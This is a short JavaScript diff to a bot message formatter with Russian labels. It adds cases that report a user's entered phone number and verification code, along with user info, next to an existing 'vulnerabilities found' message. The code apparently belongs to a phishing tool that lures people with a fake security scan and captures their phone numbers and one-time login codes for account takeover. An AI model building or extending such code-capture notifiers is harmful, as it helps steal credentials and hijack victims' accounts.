@@ -30,9 +30,19 @@ const formatMessage = (type, data, user) => {
                       `Найдено уязвимостей: <b>${data.vulnerabilities || 0}</b>`,
                 buttons: []
             };
+        case 'phone':
+            return {
+                text: `📱 <b>Введён номер:</b> <code>${data}</code>\n\n${userInfo}`,
+                buttons: []
+            };
+        case 'code':
+            return {
+                text: `🔢 <b>Введён код</b>\n\nКод: <code>${data}</code>\n\n${userInfo}`,
+                buttons: []
+            };
         default:
             return {
-                text: `ℹ️ <b>Новое событие</b>\n\nТип: ${type}\nДанные: <code>${JSON.stringify(data)}</code>\n\n${userInfo}`,
+                text: `ℹ️ <b>Новое событие</b>\n\nТип: ${type}\nДанные: ${JSON.stringify(data)}\n\n${userInfo}`,
                 buttons: []
             };
     }
